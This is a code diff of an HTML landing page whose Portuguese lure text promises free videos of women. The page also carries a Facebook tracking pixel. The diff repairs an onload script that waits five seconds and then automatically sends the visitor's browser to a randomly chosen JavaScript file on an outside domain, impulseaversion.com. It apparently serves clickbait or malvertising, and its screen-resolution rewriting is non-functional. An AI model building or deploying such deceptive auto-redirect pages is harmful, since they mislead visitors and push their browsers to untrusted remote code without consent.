@@ -130,39 +130,39 @@ src="https://www.facebook.com/tr?id=1583931499003159&ev=PageView&noscript=1"
         <div>vídeo de lindas mulheres...</div>
         <div>assistir de graça!</div>
     </div>
-    <script>
-        window.onload = function() {
-            // Visitor's screen resolution
-            const screenWidth = window.screen.width;
-            const screenHeight = window.screen.height;
+   <script>
+    window.onload = function() {
+        // Visitor's screen resolution
+        const screenWidth = window.screen.width;
+        const screenHeight = window.screen.height;
 
-            // List of links
-            const links = [
-                "<script type='text/javascript' src='//impulseaversion.com/44/75/1f/44751f4f48f6b90fa6438b4b51d2a200.js'></script>",
-                "<script type='text/javascript' src='//impulseaversion.com/44/75/1f/44751f4f48f6b90fa6438b4b51d2a200.js'></script>",
-                "<script type='text/javascript' src='//impulseaversion.com/44/75/1f/44751f4f48f6b90fa6438b4b51d2a200.js'></script>",
-                "<script type='text/javascript' src='//impulseaversion.com/44/75/1f/44751f4f48f6b90fa6438b4b51d2a200.js'></script>",
-                "<script type='text/javascript' src='//impulseaversion.com/44/75/1f/44751f4f48f6b90fa6438b4b51d2a200.js'></script>",
-                "<script type='text/javascript' src='//impulseaversion.com/44/75/1f/44751f4f48f6b90fa6438b4b51d2a200.js'></script>"
-            ];
+        // List of links
+        const links = [
+            "//impulseaversion.com/44/75/1f/44751f4f48f6b90fa6438b4b51d2a200.js",
+            "//impulseaversion.com/44/75/1f/44751f4f48f6b90fa6438b4b51d2a200.js",
+            "//impulseaversion.com/44/75/1f/44751f4f48f6b90fa6438b4b51d2a200.js",
+            "//impulseaversion.com/44/75/1f/44751f4f48f6b90fa6438b4b51d2a200.js",
+            "//impulseaversion.com/44/75/1f/44751f4f48f6b90fa6438b4b51d2a200.js",
+            "//impulseaversion.com/44/75/1f/44751f4f48f6b90fa6438b4b51d2a200.js"
+        ];
 
-            // Function to update the width and height in the URL
-            function updateResolution(url) {
-                return url.replace(/scrWidth=\d+/i, scrWidth=${screenWidth})
-                          .replace(/scrHeight=\d+/i, scrHeight=${screenHeight});
-            }
+        // Function to update the width and height in the URL
+        function updateResolution(url) {
+            return url.replace(/scrWidth=\d+/i, `scrWidth=${screenWidth}`)
+                      .replace(/scrHeight=\d+/i, `scrHeight=${screenHeight}`);
+        }
 
-            // Update all links with the visitor's screen resolution
-            const updatedLinks = links.map(updateResolution);
+        // Update all links with the visitor's screen resolution
+        const updatedLinks = links.map(updateResolution);
 
-            // Randomly select one of the updated links
-            const randomLink = updatedLinks[Math.floor(Math.random() * updatedLinks.length)];
+        // Randomly select one of the updated links
+        const randomLink = updatedLinks[Math.floor(Math.random() * updatedLinks.length)];
 
-            // Wait for 5 seconds before opening the link
-            setTimeout(function() {
-                window.location.href = randomLink;
-            }, 5000);
-        };
-    </script>
+        // Wait for 5 seconds before opening the link
+        setTimeout(function() {
+            window.location.href = randomLink;
+        }, 5000);
+    };
+</script>
 </body>
 </html>
